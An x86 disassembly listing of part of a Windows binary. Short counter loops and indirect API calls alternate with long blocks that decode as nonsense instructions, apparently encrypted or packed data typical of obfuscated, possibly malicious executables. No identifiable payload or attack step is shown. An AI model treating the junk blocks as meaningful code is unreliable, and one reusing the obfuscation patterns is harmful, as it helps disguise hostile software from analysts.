  40ac83:	adc    eax,0xc83b16c8
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x4337eb,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x43386f,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43386f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43386f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43386f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433908
  40acc6:	push   0x43394c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43386f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43386f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43386f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43386f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43381f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x576fdc10],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad2f
  40ad2c:	jg     0x40acfb
  40ad2e:	pop    es
  40ad2f:	ret    
  40ad30:	ins    DWORD PTR es:[edi],dx
  40ad31:	icebp  
  40ad32:	or     ch,BYTE PTR [ecx+0x6199a6c2]
  40ad38:	cmc    
  40ad39:	and    eax,0xea7f6f75
  40ad3e:	push   ds
  40ad3f:	push   cs
  40ad40:	sub    ah,BYTE PTR [ebx+0x45224266]
  40ad46:	xor    dl,BYTE PTR [ecx+0x49]
  40ad49:	xchg   edi,eax
  40ad4a:	and    al,0x73
  40ad4c:	test   al,0x2d
  40ad4e:	fwait
  40ad4f:	mov    edx,0x656ebdc4
  40ad54:	pusha  
  40ad55:	loop   0x40ad18
  40ad57:	push   DWORD PTR [ebx+0x5de7efa3]
  40ad5d:	aas    
  40ad5e:	dec    esp
  40ad5f:	pushf  
  40ad60:	add    DWORD PTR [ecx+eiz*2-0x43],ebx
  40ad64:	adc    DWORD PTR [eax+0x1ba15992],0x36
  40ad6b:	mov    dh,0xce
  40ad6d:	cmp    DWORD PTR [edx+0x112a7ed6],ebp
  40ad73:	mov    ds:0x39338384,eax
  40ad78:	mov    ebx,DWORD PTR [ebp+0x56]
  40ad7b:	adc    DWORD PTR [ebp+0x3d],eax
  40ad7e:	inc    ebx
  40ad7f:	and    al,0x18
  40ad81:	push   ebp
  40ad82:	inc    edi
  40ad83:	sub    bh,BYTE PTR [ebx+ebp*8-0x51ae6a5c]
  40ad8a:	inc    edi
  40ad8b:	sbb    BYTE PTR [ebp-0x69],dl
  40ad8e:	aad    0x97
  40ad90:	and    bl,BYTE PTR [edx-0xec01a1e]
  40ad96:	push   eax
  40ad97:	popa   
  40ad98:	scas   eax,DWORD PTR es:[edi]
  40ad99:	dec    ecx
  40ad9a:	jp     0x40ad75
  40ad9c:	retf   0xad4f
  40ad9f:	shl    DWORD PTR [esi],cl
  40ada1:	cmc    
  40ada2:	jae    0x40ad73
  40ada4:	cwde   
  40ada5:	cmp    al,0xe9
  40ada7:	stc    
  40ada8:	(bad)  
  40ada9:	push   ebx
  40adaa:	cld    
  40adab:	stos   DWORD PTR es:[edi],eax
  40adac:	sti    
  40adad:	jmp    0xef442873
  40adb2:	sub    ah,BYTE PTR [esi-0x46]
  40adb5:	aas    
  40adb6:	jno    0x40ae2a
  40adb8:	adc    DWORD PTR [ecx-0x6b58bb2c],ebx
  40adbe:	push   esi
  40adbf:	xchg   edi,eax
  40adc0:	popa   
  40adc1:	jle    0x40addd
  40adc3:	sub    ecx,DWORD PTR [esi+0x143f94d2]
  40adc9:	std    
  40adca:	int    0x6a
  40adcc:	fild   QWORD PTR [ecx]
  40adce:	and    DWORD PTR [edx*8-0x3a4c998],eax
  40add5:	sbb    eax,0x5f98d5b8
  40adda:	xchg   esp,eax
  40addb:	and    al,0xdb
  40addd:	in     eax,dx
  40adde:	aam    0xd4
  40ade0:	inc    ecx
  40ade1:	inc    esi
  40ade2:	sbb    eax,0x2fe0198c
  40ade7:	mov    ebx,0xce922fda
  40adec:	iret   
  40aded:	div    bl
  40adef:	pop    edi
  40adf0:	lock fiadd WORD PTR [edi+ebp*1+0x75a34d41]
  40adf8:	lea    edx,[edi-0x34dbce3d]
  40adfe:	out    dx,al
  40adff:	mov    ds:0xda5dec17,eax
  40ae04:	div    edx
  40ae06:	mov    edi,ebp
  40ae08:	inc    ecx
  40ae09:	push   ebp
  40ae0a:	add    eax,0xf1eeae57
  40ae0f:	pushf  
  40ae10:	inc    eax
  40ae11:	daa    
  40ae12:	dec    esp
  40ae13:	cs xchg edx,eax
  40ae15:	data16 jg 0x40add4
  40ae18:	push   0xfffffff0
  40ae1a:	jbe    0x40ae83
  40ae1c:	add    DWORD PTR [eax+0x51],edx
  40ae1f:	sar    DWORD PTR ds:[edi],cl
  40ae22:	adc    eax,0xe6eebe7f
  40ae27:	callw  0x3d97
  40ae2b:	dec    ebp
  40ae2c:	outs   dx,DWORD PTR ds:[esi]
  40ae2d:	(bad)  [ecx]
  40ae2f:	dec    ebp
  40ae30:	shl    BYTE PTR [edx-0x52],cl
  40ae33:	cli    
  40ae34:	pop    edx
  40ae35:	add    esi,DWORD PTR [edi-0x36]
  40ae38:	add    ecx,esp
  40ae3a:	push   esp
  40ae3b:	std    
  40ae3c:	jne    0x40ae74
  40ae3e:	or     al,0x7
  40ae40:	int3   
  40ae41:	fist   DWORD PTR [edi+0x12cc00e3]
  40ae47:	xlat   BYTE PTR ds:[ebx]
  40ae48:	fidivr WORD PTR [ebx+0x6c]
  40ae4b:	rol    DWORD PTR [edx],1
  40ae4d:	cli    
  40ae4e:	xchg   edx,eax
  40ae4f:	cld    
  40ae50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae51:	mov    eax,0xcd400e27
  40ae56:	pushf  
  40ae57:	retf   0xb27d
  40ae5a:	xor    al,0xe1
  40ae5c:	daa    
  40ae5d:	cld    
  40ae5e:	xor    ebp,DWORD PTR [ebp+0x65]
  40ae61:	mov    ecx,0xa90fcd56
  40ae66:	xchg   BYTE PTR fs:[edx],ch
  40ae69:	xor    bl,ah
  40ae6b:	mov    BYTE PTR [ebx-0x16],dl
  40ae6e:	xor    BYTE PTR [ebx],dh
  40ae70:	jp     0x40aebf
  40ae72:	rcl    edi,cl
  40ae74:	push   0xffffffa9
  40ae76:	xor    eax,0x3b3201cd
  40ae7b:	or     esi,esp
  40ae7d:	jp     0x40ae5a
  40ae7f:	mov    cl,0x89
  40ae81:	gs sahf 
  40ae83:	call   0x1c8ba6cc
  40ae88:	out    dx,eax
  40ae89:	call   0xd09357c8
  40ae8e:	scas   al,BYTE PTR es:[edi]
  40ae8f:	test   DWORD PTR [esi],esi
  40ae91:	arpl   WORD PTR ds:0xdaffeeef,sp
  40ae97:	cmp    DWORD PTR [ecx-0x7],0x21
  40ae9b:	add    DWORD PTR [ebx-0x28f3c1d0],0x65
  40aea2:	(bad)  
  40aea3:	mov    edx,DWORD PTR [ebx]
  40aea5:	leave  
  40aea6:	vpsrld ymm2,ymm5,XMMWORD PTR [ebp+0x3ad3e8f]
  40aeae:	mov    ecx,DWORD PTR [ebx]
  40aeb0:	pop    edi
  40aeb1:	fwait
  40aeb2:	push   eax
  40aeb3:	xchg   esi,eax
  40aeb4:	pop    edi
  40aeb5:	dec    esp
  40aeb6:	ins    DWORD PTR es:[edi],dx
  40aeb7:	dec    eax
  40aeb8:	hlt    
  40aeb9:	add    dh,bl
  40aebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aebc:	add    eax,0xb0103bdf
  40aec1:	push   ds
  40aec2:	push   esi
  40aec3:	call   0x1d77:0x316d9eb8
  40aeca:	sbb    DWORD PTR [ebp-0x7317a902],edi
  40aed0:	out    0x65,al
  40aed2:	fild   DWORD PTR [edx+0xc]
  40aed5:	lahf   
  40aed6:	push   es
  40aed7:	push   eax
  40aed8:	into   
  40aed9:	das    
  40aeda:	scas   al,BYTE PTR es:[edi]
  40aedb:	iret   
  40aedc:	jecxz  0x40ae7d
  40aede:	mov    esi,0x6b822759
  40aee3:	mov    esp,0x4a9cd316
  40aee8:	test   eax,0xadd204b6
  40aeed:	mov    cs,WORD PTR [esp+edx*1-0x5bffaf2d]
  40aef4:	out    0xe2,eax
  40aef6:	sbb    al,0x9c
  40aef8:	rol    BYTE PTR ds:0xcbe94d73,0x15
  40aeff:	call   0xb6d:0x4b3c23cf
  40af06:	cmp    eax,0xf17fc551
  40af0b:	nop
  40af0c:	jmp    0x1e14:0xd5e15975
  40af13:	lahf   
  40af14:	repnz loope 0x40af12
  40af17:	push   ecx
  40af18:	adc    bl,BYTE PTR [edx]
  40af1a:	sar    BYTE PTR [ebp+0x0],cl
  40af1d:	inc    ecx
  40af1e:	cwde   
  40af1f:	adc    DWORD PTR [eax],esp
  40af21:	fist   WORD PTR [ecx-0x52]
  40af24:	bound  edx,QWORD PTR [edi+0x57]
  40af27:	inc    esp
  40af28:	outs   dx,BYTE PTR ds:[esi]
  40af29:	popf   
  40af2a:	outs   dx,DWORD PTR es:[esi]
  40af2c:	push   cs
  40af2d:	hlt    
  40af2e:	ret    
  40af2f:	retf   
  40af30:	mov    ebp,0xcbfaf6a3
  40af35:	or     ah,BYTE PTR [ebp-0x46]
  40af38:	lahf   
  40af39:	pop    ss
  40af3a:	sbb    esp,DWORD PTR [edi-0x7de7e3ab]
  40af40:	in     eax,0x2d
  40af42:	ret    0x9950
  40af45:	push   0x9ad3ff
  40af4a:	out    0x95,eax
  40af4c:	mov    al,0x10
  40af4e:	ret    0xe0b0
  40af51:	mov    ebx,0xf8c9187e
  40af56:	(bad)  
  40af57:	mov    ebx,0x4c99d8bd
  40af5c:	xchg   esp,eax
  40af5d:	sar    DWORD PTR [ebx+0x21a1fa29],1
  40af63:	ret    
  40af64:	mov    al,ds:0xbc7b93e2
  40af69:	arpl   WORD PTR [ecx+0x2b231ec1],di
  40af6f:	jp     0x40af68
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433827
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4337df
  40af93:	sub    DWORD PTR ds:0x43378f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4337db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4337db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4337db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4337db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4337db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4337db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4337db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4337db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433827,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	pop    ebx
  40b018:	xor    BYTE PTR [ebx],ah
  40b01a:	adc    eax,0x7e7ef764
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	and    al,0x73
  40b025:	xchg   ebx,eax
  40b026:	add    esp,ebx
  40b028:	inc    edx
  40b029:	lds    eax,FWORD PTR ds:[edi+0x67d9333b]
  40b030:	cs dec ebx
  40b032:	add    ecx,esi
  40b034:	add    DWORD PTR [ebx],eax
  40b036:	jb     0x40b06b
  40b038:	inc    edi
  40b039:	retf   0xf2ea
  40b03c:	pop    ss
  40b03d:	aam    0x66
  40b03f:	adc    eax,0xb8762bdd
  40b044:	lock fbld TBYTE PTR ds:0xdec48661
  40b04b:	fsub   QWORD PTR [ebp+0x5ea01e91]
  40b051:	test   DWORD PTR ds:0x4d05347,ecx
  40b057:	xchg   edx,eax
  40b058:	xor    eax,0xbfb8f42c
  40b05d:	and    ch,BYTE PTR [ebx]
  40b05f:	mov    dh,0xfd
  40b061:	ret    
  40b062:	fsubrp st(2),st
  40b064:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b066:	add    eax,0xeb0dace9
  40b06b:	fyl2xp1 
  40b06d:	and    eax,DWORD PTR [ecx+0x56]
  40b070:	cmp    al,0x9d
  40b072:	add    al,0x82
  40b074:	cli    
  40b075:	mov    ds:0xf00020d6,al
  40b07a:	popa   
  40b07b:	add    al,0xa2
  40b07d:	(bad)  
  40b07e:	jns    0x40b099
  40b080:	jmp    FWORD PTR [eax-0xf44be38]
  40b086:	mov    ebx,0x1d3e94dd
  40b08b:	dec    edx
  40b08c:	mov    WORD PTR [eax],gs
  40b08e:	xor    al,BYTE PTR [edx-0x23ce1bed]
  40b094:	std    
  40b095:	cli    
  40b096:	add    cl,BYTE PTR [edi+0x33]
  40b099:	jmp    DWORD PTR [esi+0x62]
  40b09c:	jecxz  0x40b0e0
  40b09e:	jecxz  0x40b10c
  40b0a0:	dec    ecx
  40b0a1:	sbb    eax,DWORD PTR [esi+0x50]
  40b0a4:	inc    ebx
  40b0a5:	sub    al,0x77
  40b0a7:	jb     0x40b084
  40b0a9:	out    dx,eax
  40b0aa:	addr16 pusha 
  40b0ac:	and    esi,DWORD PTR [edx]
  40b0ae:	inc    ecx
  40b0af:	and    ch,BYTE PTR gs:[edi+0x3a]
  40b0b3:	loopne 0x40b0c5
  40b0b5:	addr16 test al,0xc3
  40b0b8:	mov    ebx,0x127315cc
  40b0bd:	retf   
  40b0be:	data16 jl 0x40b135
  40b0c1:	xlat   BYTE PTR ds:[ebx]
  40b0c2:	ffreep st(6)
  40b0c4:	sub    eax,0xef2d9776
  40b0c9:	sbb    al,0x1d
  40b0cb:	sbb    al,0x81
  40b0cd:	push   edi
  40b0ce:	gs daa 
  40b0d0:	and    eax,0x3e8ad500
  40b0d5:	mov    ds:0x98b36cdc,al
  40b0da:	lock pop edx
  40b0dc:	and    dl,BYTE PTR [esp+eiz*4]
  40b0df:	arpl   WORD PTR ss:[eax+ecx*4-0x7e],sp
  40b0e4:	(bad)  
  40b0e5:	push   0x7c
  40b0e7:	adc    bh,BYTE PTR [edi+0x67]
  40b0ea:	or     al,BYTE PTR [ebx]
  40b0ec:	pop    edi
  40b0ed:	enter  0x4d2,0x95
  40b0f1:	hlt    
  40b0f2:	stos   DWORD PTR es:[edi],eax
  40b0f3:	adc    esp,esp
  40b0f5:	iret   
  40b0f6:	inc    ebp
  40b0f7:	inc    ebp
  40b0f8:	bound  ecx,QWORD PTR [edx+0x69005b57]
  40b0fe:	pop    edx
  40b0ff:	jb     0x40b10b
  40b101:	outs   dx,DWORD PTR ds:[esi]
  40b102:	mov    bl,0x5
  40b104:	dec    esi
  40b105:	and    eax,0x4700edcd
  40b10a:	jmp    0xd2ecef5a
  40b10f:	sbb    BYTE PTR [esi-0x100cbbcc],bl
  40b115:	retf   0xf88b
  40b118:	pop    edi
  40b119:	ss push ebp
  40b11b:	push   0xffffffc7
  40b11d:	fdivp  st(1),st
  40b11f:	stos   DWORD PTR es:[edi],eax
  40b120:	mov    ah,0x84
  40b122:	dec    esp
  40b123:	or     dh,BYTE PTR [ebx-0x7f]
  40b126:	jns    0x40b122
  40b128:	lea    ebp,[esi]
  40b12a:	adc    eax,0xe3214fcf
  40b12f:	data16 fwait
  40b131:	cmc    
  40b132:	into   
  40b133:	cwde   
  40b134:	leave  
  40b135:	cwde   
  40b136:	enter  0x1085,0xaa
  40b13a:	pop    esi
  40b13b:	mov    dh,BYTE PTR [ecx+0x7df65280]
  40b141:	fs push esi
  40b143:	or     edx,ecx
  40b145:	adc    BYTE PTR [ecx-0x4b],al
  40b148:	sahf   
  40b149:	enter  0x88db,0x80
  40b14d:	out    dx,eax
  40b14e:	jb     0x40b139
  40b150:	stc    
  40b151:	inc    edi
  40b152:	sahf   
  40b153:	ja     0x40b19e
  40b155:	mov    esp,0x5e8fa969
  40b15a:	adc    al,0x6a
  40b15c:	mov    al,0x24
  40b15e:	push   esi
  40b15f:	ret    
  40b160:	retf   0xc0ff
  40b163:	mov    WORD PTR [esi+ebx*2-0x3455c137],cs
  40b16a:	cmp    DWORD PTR [ebx],edx
  40b16c:	cwde   
  40b16d:	mov    ch,0x27
  40b16f:	or     edi,DWORD PTR [ebx-0x733e15ae]
  40b175:	xor    eax,0x73ef58af
  40b17a:	test   DWORD PTR [edi+0x74],ebx
  40b17d:	js     0x40b1d5
  40b17f:	mov    ebp,0xab96da01
  40b184:	test   al,0xe4
  40b186:	push   ds
  40b187:	push   cs
  40b188:	add    ebx,DWORD PTR [ebp+0x48]
  40b18b:	add    ecx,DWORD PTR [ebx-0x5c1c830]
  40b191:	mul    cl
  40b193:	mov    esi,0xe6fb0ce4
  40b198:	enter  0xa322,0x75
  40b19c:	adc    edi,DWORD PTR [ebx-0x651932fc]
  40b1a2:	(bad)  
  40b1a3:	dec    edi
  40b1a4:	or     dl,BYTE PTR [esp+eiz*8]
  40b1a7:	mov    ah,0xa7
  40b1a9:	pusha  
  40b1aa:	mov    esp,DWORD PTR [edi]
  40b1ac:	sub    esp,DWORD PTR [edi]
  40b1ae:	mov    bx,0xcaa7
  40b1b2:	xor    al,0xc8
  40b1b4:	ror    ebx,0xa5
  40b1b7:	lea    eax,[ebp-0x9]
  40b1ba:	sete   BYTE PTR [ecx+0x6c]
  40b1be:	sub    al,0x2f
  40b1c0:	fist   WORD PTR [ecx]
  40b1c2:	sbb    BYTE PTR [edi+0x6ce255f4],dh
  40b1c8:	jp     0x40b192
  40b1ca:	inc    esp
  40b1cb:	dec    esp
  40b1cc:	pop    esp
  40b1cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ce:	push   0x7e
  40b1d0:	stc    
  40b1d1:	mov    ebx,0xefb0176
  40b1d6:	mov    ebx,0x52baef2
  40b1db:	lods   al,BYTE PTR ds:[esi]
  40b1dc:	lds    esi,FWORD PTR ds:0x7ca4e8c7
  40b1e2:	inc    esi
  40b1e3:	fcom   QWORD PTR [edx+ebp*8]
  40b1e6:	arpl   WORD PTR [esi+eiz*8],ax
  40b1e9:	push   edx
  40b1ea:	jae    0x40b26b
  40b1ec:	sbb    cl,dh
  40b1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1ef:	pop    ebx
  40b1f0:	test   BYTE PTR [edi],0xc8
  40b1f3:	adc    esp,DWORD PTR [eax-0xe65c9ea]
  40b1f9:	shl    BYTE PTR [eax],cl
  40b1fb:	jae    0x40b26d
  40b1fd:	lds    eax,FWORD PTR [edx+0x6c]
  40b200:	mov    edx,DWORD PTR [edx+0x4c]
  40b203:	cs dec ebp
  40b205:	cmp    ch,dl
  40b207:	cmp    eax,0x1dbc410
  40b20c:	int    0xd9
  40b20e:	mov    esp,0x70224026
  40b213:	in     al,0x55
  40b215:	add    ah,0x46
  40b218:	mov    ebp,0x69b0d9bb
  40b21d:	push   eax
  40b21e:	xor    DWORD PTR [ebx+0x24],edi
  40b221:	xchg   BYTE PTR [esi-0x60],dl
  40b224:	sar    al,cl
  40b226:	inc    esp
  40b227:	dec    ebp
  40b228:	dec    ebx
  40b229:	jle    0x40b25f
  40b22b:	mov    eax,0x7e72fbdf
  40b230:	sub    ecx,DWORD PTR [edx]
  40b232:	aam    0xcb
  40b234:	test   eax,0xc5977bc
  40b239:	jb     0x40b23e
  40b23b:	out    dx,eax
  40b23c:	fmul   DWORD PTR [esi]
  40b23e:	fcomp  DWORD PTR es:[ebx+0x42]
  40b242:	jnp    0x40b2a3
  40b244:	cdq    
  40b245:	pop    es
  40b246:	add    eax,0x49e26ae2
  40b24b:	mov    ch,BYTE PTR [ebx+0x11f4ab28]
  40b251:	mov    ebp,0x4f1e0d42
  40b256:	loop   0x40b2a3
  40b258:	enter  0x5874,0xd3
  40b25c:	lahf   
  40b25d:	mov    ss,WORD PTR [esi]
  40b25f:	mov    al,ds:0xe2c1331
  40b264:	or     al,0x88
  40b266:	pop    edx
  40b267:	push   edx
  40b268:	mov    eax,DWORD PTR ds:[ebp-0x14]
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	jo     0x40b205
  40b285:	mov    ch,0xe7
  40b287:	cs bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	ret    
  40b290:	jle    0x40b2fd
  40b292:	cld    
  40b293:	xor    al,0xa4
  40b295:	sub    DWORD PTR [eax+0x14a4b654],ecx
  40b29b:	bound  edi,QWORD PTR [ecx-0x50]
  40b29e:	enter  0xd0f8,0x5e
  40b2a2:	dec    edx
  40b2a3:	pusha  
  40b2a4:	je     0x40b315
  40b2a6:	push   esp
  40b2a7:	test   al,0xea
  40b2a9:	sbb    cl,BYTE PTR [ebp-0x28]
  40b2ac:	dec    ebp
  40b2ae:	icebp  
  40b2af:	out    dx,eax
  40b2b0:	clc    
  40b2b1:	daa    
  40b2b2:	pop    edx
  40b2b3:	pop    es
  40b2b4:	xchg   ch,bl
  40b2b6:	or     eax,0xe7b46ad8
  40b2bb:	fst    QWORD PTR [ecx+edx*1+0x47]
  40b2bf:	es mov esi,0xbb8b259e
  40b2c5:	cmp    bl,dl
  40b2c7:	or     al,0x1f
  40b2c9:	mov    dh,0xe3
  40b2cb:	sub    DWORD PTR [ebp-0x2fdcf363],ebx
  40b2d1:	mov    esp,0x2551fb61
  40b2d6:	int    0x8f
  40b2d8:	(bad)  
  40b2d9:	pushf  
  40b2da:	or     ah,ah
  40b2dc:	jb     0x40b33a
  40b2de:	fidiv  DWORD PTR ds:0x5f47eea9
  40b2e4:	or     al,0xb1
  40b2e6:	cmp    al,0xde
  40b2e8:	ins    DWORD PTR es:[edi],dx
  40b2e9:	sbb    al,0x75
  40b2eb:	aas    
  40b2ec:	pop    esi
  40b2ed:	repz in eax,0xfd
  40b2f0:	scas   eax,DWORD PTR es:[edi]
  40b2f1:	push   si
  40b2f3:	repz popf 
  40b2f5:	adc    eax,0xa4c7c579
  40b2fa:	and    edx,DWORD PTR [esi+0x6e4c866e]
  40b300:	shl    DWORD PTR [edi],1
  40b302:	ficomp WORD PTR [ebp-0x4a]
  40b305:	fwait
  40b306:	sbb    BYTE PTR [edi+0x51],dl
  40b309:	daa    
  40b30a:	fmul   st,st(4)
  40b30c:	dec    ebp
  40b30d:	xlat   BYTE PTR ds:[ebx]
  40b30e:	sub    BYTE PTR [ecx-0x5],al
  40b311:	shl    dh,1
  40b313:	mov    edx,0xa1842f6e
  40b318:	sub    esi,DWORD PTR [eax+ecx*8]
  40b31b:	mov    al,ds:0xe60c4ae1
  40b320:	push   ds
  40b321:	jmp    FWORD PTR [eax]
  40b323:	push   edx
  40b324:	fdivrp st(1),st
  40b326:	pop    ecx
  40b327:	(bad)  [edi+0xfddf129]
  40b32d:	arpl   WORD PTR [ecx],sp
  40b32f:	add    BYTE PTR [ebx],dh
  40b331:	jae    0x40b38d
  40b333:	adc    bh,BYTE PTR [esi-0x1b]
  40b336:	mov    edi,0xc1c6ac28
  40b33b:	xor    al,0x19
  40b33d:	test   al,0xd7
  40b33f:	and    al,0xdb
  40b341:	mov    al,0xbc
  40b343:	mov    WORD PTR [ebx-0x9bf4aa8],ds
  40b349:	xor    DWORD PTR [edx+ebp*2],eax
  40b34c:	jg     0x40b399
  40b34e:	xchg   esi,eax
  40b34f:	icebp  
  40b350:	mov    cl,0x3
  40b352:	add    DWORD PTR [eax-0x2f1810ad],ecx
  40b358:	push   edx
  40b359:	sbb    eax,edi
  40b35b:	mov    edx,0x9028a0e8
  40b360:	pop    edx
  40b361:	and    eax,0x9d56b2f1
  40b366:	jmp    0xe4baa77e
  40b36b:	adc    bl,ch
  40b36d:	inc    ebx
  40b36e:	adc    eax,0x8c7ff1bf
  40b373:	cmp    eax,0x2268dadd
  40b378:	mov    dh,0xcb
  40b37a:	loope  0x40b353
  40b37c:	stos   BYTE PTR es:[edi],al
  40b37d:	sar    DWORD PTR [eax+edi*8],cl
  40b380:	and    eax,0xae5ffdf1
  40b385:	inc    ecx
  40b386:	into   
  40b387:	sub    edx,DWORD PTR [edx-0x5b]
  40b38a:	mov    cl,0xe4
  40b38c:	add    ebx,DWORD PTR [eax+0x43132b54]
  40b392:	jecxz  0x40b409
  40b394:	pop    edi
  40b395:	fldenv [edx-0x5e32950b]
  40b39b:	mov    eax,ds:0xcd32d157
  40b3a0:	ins    DWORD PTR es:[edi],dx
  40b3a1:	(bad)  
  40b3a2:	ds cwde 
  40b3a4:	adc    ah,BYTE PTR [ecx]
  40b3a6:	and    eax,0x1e32900
  40b3ab:	mov    ds,esi
  40b3ad:	push   esi
  40b3ae:	js     0x40b42c
  40b3b0:	jge    0x40b367
  40b3b2:	out    0xac,eax
  40b3b4:	pop    esi
  40b3b5:	sbb    dh,bh
  40b3b7:	jbe    0x40b3c9
  40b3b9:	stc    
  40b3ba:	ins    BYTE PTR es:[edi],dx
  40b3bb:	mov    ds:0xae0fc45a,al
  40b3c0:	lahf   
  40b3c1:	dec    ecx
  40b3c2:	adc    ah,ch
  40b3c4:	mov    ebx,edi
  40b3c6:	bound  esp,QWORD PTR [ecx+0x24]
  40b3c9:	das    
  40b3ca:	push   0xf12dcf3a
  40b3cf:	adc    al,0x1c
  40b3d1:	push   ecx
  40b3d2:	inc    eax
  40b3d3:	push   0x4
  40b3d5:	cmc    
  40b3d6:	scas   al,BYTE PTR es:[edi]
  40b3d7:	(bad)  
  40b3d8:	bound  eax,QWORD PTR [ebx-0x19ef10c9]
  40b3de:	xchg   BYTE PTR [ebx-0x7ac4f6ce],ah
  40b3e4:	leave  
  40b3e5:	dec    edi
  40b3e6:	lds    esi,FWORD PTR [ebx]
  40b3e8:	loope  0x40b38a
  40b3ea:	push   esi
  40b3eb:	(bad)  
  40b3ec:	int    0xbb
  40b3ee:	(bad)  [ebx]
  40b3f0:	scas   al,BYTE PTR es:[edi]
  40b3f1:	fdivr  QWORD PTR [ebx-0x23]
  40b3f4:	sub    al,0x90
  40b3f6:	fwait
  40b3f7:	pusha  
  40b3f8:	adc    DWORD PTR [ecx+0x55],esi
  40b3fb:	xchg   esp,eax
  40b3fc:	imul   eax,DWORD PTR ds:0xc6685728
  40b403:	mov    esp,0x6a2e3e93
  40b408:	shl    DWORD PTR [ebx],cl
  40b40a:	dec    DWORD PTR [ebx+ebp*8]
  40b40d:	cdq    
  40b40e:	mov    edi,0x9e8abcc2
  40b413:	fcomp  QWORD PTR [esi+0x31]
  40b416:	inc    ecx
  40b417:	in     eax,dx
  40b418:	bound  si,DWORD PTR cs:[eax]
  40b41c:	clc    
  40b41d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b41e:	test   DWORD PTR [edx-0x41],edi
  40b421:	or     dl,BYTE PTR [ecx-0x78]
  40b424:	cwde   
  40b425:	(bad)  
  40b426:	pop    eax
  40b427:	jbe    0x40b3b3
  40b429:	rol    DWORD PTR [ebx+eax*4],cl
  40b42c:	xchg   ch,al
  40b42e:	iret   
  40b42f:	push   eax
  40b430:	pop    ecx
  40b431:	(bad)  
  40b432:	repnz gs pop es
  40b435:	fstp   QWORD PTR [esi]
  40b437:	mov    dl,0xd4
  40b439:	fcom   DWORD PTR [ecx-0x53]
  40b43c:	pop    ebp
  40b43d:	(bad)  
  40b43e:	jecxz  0x40b47a
  40b440:	adc    DWORD PTR [edx-0xd],edi
  40b443:	dec    edi
  40b444:	mov    ebp,DWORD PTR [ebx+0x21]
  40b447:	push   ebx
  40b448:	inc    eax
  40b449:	repz cdq 
  40b44b:	sbb    cl,ch
  40b44d:	adc    al,0x12
  40b44f:	add    DWORD PTR fs:[esi+edx*4],ebx
  40b453:	xchg   ebx,eax
  40b454:	mov    al,0x6f
  40b456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b457:	test   al,0x71
  40b459:	in     eax,0x5a
  40b45b:	mov    ecx,cs
  40b45d:	cmp    DWORD PTR [edi+0x57a15af4],edi
  40b463:	ins    DWORD PTR es:[edi],dx
  40b464:	inc    ecx
  40b465:	cmp    DWORD PTR [edi-0x7ba582d8],ebx
  40b46b:	imul   ebx,DWORD PTR [ebx],0xffffffd3
  40b46e:	je     0x40b4d0
  40b470:	in     al,0x32
  40b472:	popf   
  40b473:	pop    esp
  40b474:	mov    ah,0xf6
  40b476:	mov    eax,0x9f5c1f0e
  40b47b:	test   cl,al
  40b47d:	cli    
  40b47e:	inc    ebx
  40b47f:	icebp  
